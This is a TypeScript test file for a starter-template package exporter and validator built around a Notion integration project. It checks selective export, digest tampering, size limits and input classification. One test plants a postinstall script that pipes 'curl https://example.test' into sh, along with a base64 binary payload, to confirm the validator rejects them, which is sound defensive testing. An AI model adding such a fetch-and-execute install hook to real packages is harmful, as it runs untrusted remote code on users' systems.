import { describe, expect, it } from 'vitest'
import { buildStarterTemplatePackageFromProject } from '../design/starter-template-export'
import {
  STARTER_TEMPLATE_PACKAGE_LIMITS,
  validateStarterTemplatePackage,
} from '../design/starter-template-package'
import type {
  ArtifactRecord,
  IntegrationDiscoveryRecord,
  ProjectDetail,
  ProjectDocumentRecord,
  WorkspaceConnection,
} from '../design/project-types'

function project(): ProjectDetail {
  return {
    id: 'project-1',
    workspace_id: 'workspace-1',
    name: 'Notion Fronting',
    summary: 'Govern selected Notion operations.',
    domain: 'notion',
    labels: [],
    project_type: 'governed_service_project',
    integration_profile: { kind: 'none', systems: [] },
    created_at: '2026-05-10T00:00:00Z',
    updated_at: '2026-05-10T00:00:00Z',
    requirements_count: 0,
    scenarios_count: 0,
    proposals_count: 0,
    evaluations_count: 0,
    shapes_count: 0,
  }
}

function documentRecord(
  id: string,
  title: string,
  overrides: Partial<Pick<ProjectDocumentRecord, 'filename' | 'media_type'>> = {},
): ProjectDocumentRecord {
  return {
    id,
    project_id: 'project-1',
    title,
    kind: 'business_intent',
    filename: overrides.filename ?? `${id}.md`,
    media_type: overrides.media_type ?? 'text/markdown',
    source_path: '',
    content_hash: 'hash',
    created_at: '2026-05-10T00:00:00Z',
    updated_at: '2026-05-10T00:00:00Z',
  }
}

function connection(): WorkspaceConnection {
  return {
    id: 'conn-1',
    workspace_id: 'workspace-1',
    display_name: 'Notion API',
    backend_kind: 'native_api',
    system_kind: 'notion',
    endpoint_ref: 'https://api.notion.com/v1',
    auth_mode: 'service_delegated',
    identity_provider_ref: 'workspace-identity',
    secret_ref: 'NOTION_TOKEN',
    allowed_project_refs: ['project-1'],
    metadata: {},
    created_at: '2026-05-10T00:00:00Z',
    updated_at: '2026-05-10T00:00:00Z',
  }
}

function discoveryRecord(): IntegrationDiscoveryRecord {
  return {
    id: 'discovery-1',
    project_id: 'project-1',
    connection_id: 'conn-1',
    operation_id: 'notion.api.search',
    backend_kind: 'native_api',
    method: 'POST',
    path_template: '/search',
    side_effect_level: 'read',
    input_schema_summary: { required: ['query'], optional: [] },
    risk_notes: ['Bounded read.'],
    data: {},
    content_hash: 'hash',
    created_at: '2026-05-10T00:00:00Z',
    updated_at: '2026-05-10T00:00:00Z',
  }
}

function mappingArtifact(): ArtifactRecord {
  return {
    id: 'mapping-1',
    project_id: 'project-1',
    title: 'Search Context',
    status: 'active',
    data: {
      artifact_type: 'integration_fronting_capability_mapping',
      capability_id: 'notion.workspace.search_context',
      connection_ref: 'conn-1',
      backend_bindings: [
        {
          connection_ref: 'conn-1',
          matched_discovery_record_ids: ['discovery-1'],
        },
      ],
    },
    content_hash: 'hash',
    created_at: '2026-05-10T00:00:00Z',
    updated_at: '2026-05-10T00:00:00Z',
  }
}

describe('starter template export', () => {
  it('exports only selected project material into a package-style template envelope', async () => {
    const includedDoc = documentRecord('doc-1', 'Public intent')
    const sensitiveDoc = documentRecord('doc-2', 'Sensitive notes')
    const pkg = await buildStarterTemplatePackageFromProject({
      project: project(),
      documents: [
        { record: includedDoc, content: 'Public template-safe guidance.' },
        { record: sensitiveDoc, content: 'Sensitive material that must not leak.' },
      ],
      connections: [connection()],
      discoveryRecords: [discoveryRecord()],
      mappingArtifacts: [mappingArtifact()],
      selection: {
        documentIds: ['doc-1'],
        connectionIds: ['conn-1'],
        discoveryRecordIds: ['discovery-1'],
        mappingArtifactIds: ['mapping-1'],
      },
      exportedAt: '2026-05-10T00:00:00Z',
    })

    expect(pkg.schema).toBe('anip-starter-template-package/v0')
    expect(pkg.manifest.schema).toBe('anip-starter-template-manifest/v0')
    expect(pkg.manifest.template_digest).toMatch(/^sha256:[a-f0-9]{64}$/)
    expect(pkg.manifest.counts.documents).toBe(1)
    expect(pkg.template.anipSpecVersion).toBe('anip/0.24')
    expect(pkg.selection.documents).toBe(1)
    expect(pkg.template.documents).toHaveLength(1)
    expect(pkg.template.documents[0].content).toContain('Public template-safe guidance.')
    expect(JSON.stringify(pkg)).not.toContain('Sensitive material')
    expect(pkg.template.connections[0].secret_ref).toBe('NOTION_TOKEN')
    expect(pkg.template.capabilityMappings[0].data.connection_ref).toBe('notion-api')
    expect(pkg.template.capabilityMappings[0].data.backend_bindings[0].matched_discovery_record_ids).toEqual([
      'notion-api-search',
    ])
  })

  it('rejects selected source documents that are not Markdown files', async () => {
    const pdfDoc = documentRecord('doc-1', 'Binary source', {
      filename: 'source.pdf',
      media_type: 'application/pdf',
    })

    await expect(
      buildStarterTemplatePackageFromProject({
        project: project(),
        documents: [{ record: pdfDoc, content: '%PDF' }],
        connections: [],
        discoveryRecords: [],
        mappingArtifacts: [],
        selection: {
          documentIds: ['doc-1'],
          connectionIds: [],
          discoveryRecordIds: [],
          mappingArtifactIds: [],
        },
      }),
    ).rejects.toThrow("Template source document 'Binary source' must be a Markdown .md file.")
  })

  it('rejects tampered template package digests', async () => {
    const pkg = await buildStarterTemplatePackageFromProject({
      project: project(),
      documents: [{ record: documentRecord('doc-1', 'Public intent'), content: 'Public template-safe guidance.' }],
      connections: [],
      discoveryRecords: [],
      mappingArtifacts: [],
      selection: {
        documentIds: ['doc-1'],
        connectionIds: [],
        discoveryRecordIds: [],
        mappingArtifactIds: [],
      },
    })
    pkg.template.documents[0].content = 'Tampered content.'

    await expect(validateStarterTemplatePackage(pkg)).resolves.toContain(
      'manifest.template_digest must match the canonical template digest.',
    )
  })

  it('rejects oversized template package documents', async () => {
    const pkg = await buildStarterTemplatePackageFromProject({
      project: project(),
      documents: [{ record: documentRecord('doc-1', 'Public intent'), content: 'Public template-safe guidance.' }],
      connections: [],
      discoveryRecords: [],
      mappingArtifacts: [],
      selection: {
        documentIds: ['doc-1'],
        connectionIds: [],
        discoveryRecordIds: [],
        mappingArtifactIds: [],
      },
    })
    pkg.template.documents[0].content = 'x'.repeat(STARTER_TEMPLATE_PACKAGE_LIMITS.maxTemplateBytes + 1)
    pkg.manifest.template_digest = 'sha256:0000000000000000000000000000000000000000000000000000000000000000'

    const errors = await validateStarterTemplatePackage(pkg)
    expect(errors).toContain(`template exceeds ${STARTER_TEMPLATE_PACKAGE_LIMITS.maxTemplateBytes} bytes.`)
  })

  it('rejects Registry template documents that exceed the Registry document byte limit', async () => {
    await expect(
      buildStarterTemplatePackageFromProject({
        project: project(),
        documents: [{
          record: documentRecord('doc-1', 'Large public intent'),
          content: 'x'.repeat(STARTER_TEMPLATE_PACKAGE_LIMITS.maxTemplateDocumentBytes + 1),
        }],
        connections: [],
        discoveryRecords: [],
        mappingArtifacts: [],
        selection: {
          documentIds: ['doc-1'],
          connectionIds: [],
          discoveryRecordIds: [],
          mappingArtifactIds: [],
        },
      }),
    ).rejects.toThrow(`template.documents[0].content exceeds ${STARTER_TEMPLATE_PACKAGE_LIMITS.maxTemplateDocumentBytes} bytes.`)
  })

  it('rejects fronting mappings with required inputs missing verifier-recognized classification', async () => {
    const mapping = mappingArtifact()
    mapping.data.inputs = [
      {
        input_name: 'summary',
        input_type: 'string',
        required: true,
        summary: 'A work item summary.',
        allowed_values: [],
      },
    ]

    await expect(
      buildStarterTemplatePackageFromProject({
        project: project(),
        documents: [{ record: documentRecord('doc-1', 'Public intent'), content: 'Public template-safe guidance.' }],
        connections: [connection()],
        discoveryRecords: [discoveryRecord()],
        mappingArtifacts: [mapping],
        selection: {
          documentIds: ['doc-1'],
          connectionIds: ['conn-1'],
          discoveryRecordIds: ['discovery-1'],
          mappingArtifactIds: ['mapping-1'],
        },
      }),
    ).rejects.toThrow("capabilityMappings[0].data.inputs[0] 'summary' is required but missing verifier-recognized classification.")
  })

  it('exports reviewed Developer Definition input contracts over stale mapping inputs', async () => {
    const mapping = mappingArtifact()
    mapping.data.inputs = [
      {
        input_name: 'summary',
        input_type: 'string',
        required: true,
        summary: 'A stale mapping-level work item summary.',
        allowed_values: [],
      },
    ]

    const pkg = await buildStarterTemplatePackageFromProject({
      project: project(),
      documents: [{ record: documentRecord('doc-1', 'Public intent'), content: 'Public template-safe guidance.' }],
      connections: [connection()],
      discoveryRecords: [discoveryRecord()],
      mappingArtifacts: [mapping],
      developerDefinition: {
        artifact_type: 'developer_definition',
        capability_formalizations: [
          {
            capability_id: 'notion.workspace.search_context',
            operation_type: 'read',
            side_effect_level: 'read',
            inputs: [
              {
                input_name: 'summary',
                input_type: 'string',
                required: true,
                summary: 'Reviewed summary input.',
                allowed_values: [],
                semantic_type: 'work_item_summary',
              },
            ],
          },
        ],
      } as any,
      selection: {
        documentIds: ['doc-1'],
        connectionIds: ['conn-1'],
        discoveryRecordIds: ['discovery-1'],
        mappingArtifactIds: ['mapping-1'],
      },
    })

    expect(pkg.template.capabilityMappings[0].data.inputs[0].semantic_type).toBe('work_item_summary')
    expect(pkg.template.capabilityMappings[0].data.inputs[0].summary).toBe('Reviewed summary input.')
  })

  it('synthesizes template backend supply from reviewed fronting mappings when source-only projects have no persisted discovery rows', async () => {
    const mapping = mappingArtifact()
    mapping.data.connection_ref = 'project-1-notion-api'
    mapping.data.backend_kind = 'native_api'
    mapping.data.side_effect_level = 'read'
    mapping.data.backend_bindings = [
      {
        connection_ref: 'project-1-notion-api',
        backend_kind: 'native_api',
        raw_operation_refs: ['notion.api.search'],
        matched_discovery_record_ids: [],
        explicit_required_backend_inputs: ['query'],
        explicit_optional_backend_inputs: ['limit'],
      },
    ]
    mapping.data.inputs = [
      {
        input_name: 'query',
        input_type: 'string',
        required: true,
        summary: 'Search query.',
        semantic_type: 'search_query',
        allowed_values: [],
      },
    ]

    const pkg = await buildStarterTemplatePackageFromProject({
      project: project(),
      documents: [],
      connections: [],
      discoveryRecords: [],
      mappingArtifacts: [mapping],
      selection: {
        documentIds: [],
        connectionIds: [],
        discoveryRecordIds: [],
        mappingArtifactIds: ['mapping-1'],
      },
    })

    expect(pkg.template.connections).toHaveLength(1)
    expect(pkg.template.connections[0].idSuffix).toBe('notion-api')
    expect(pkg.template.discoveryRecords).toHaveLength(1)
    expect(pkg.template.discoveryRecords[0].operation_id).toBe('notion.api.search')
    expect(pkg.template.discoveryRecords[0].input_schema_summary).toEqual({
      required: ['query'],
      optional: ['limit'],
    })
    expect(pkg.template.capabilityMappings[0].data.connection_ref).toBe('notion-api')
    expect(pkg.template.capabilityMappings[0].data.backend_bindings[0].matched_discovery_record_ids).toEqual([
      'notion-api-search',
    ])
  })

  it('rejects executable-looking package fields and suspicious binary payloads', async () => {
    const pkg = await buildStarterTemplatePackageFromProject({
      project: project(),
      documents: [{ record: documentRecord('doc-1', 'Public intent'), content: 'Public template-safe guidance.' }],
      connections: [],
      discoveryRecords: [],
      mappingArtifacts: [],
      selection: {
        documentIds: ['doc-1'],
        connectionIds: [],
        discoveryRecordIds: [],
        mappingArtifactIds: [],
      },
    }) as any
    pkg.template.scripts = { postinstall: 'curl https://example.test | sh' }
    pkg.template.documents[0].content = 'data:application/octet-stream;base64,AAAA'

    const errors = await validateStarterTemplatePackage(pkg)
    expect(errors).toContain('package.template.scripts is not allowed in starter template packages.')
    expect(errors).toContain('package.template.documents[0].content contains a suspicious binary payload.')
  })
})
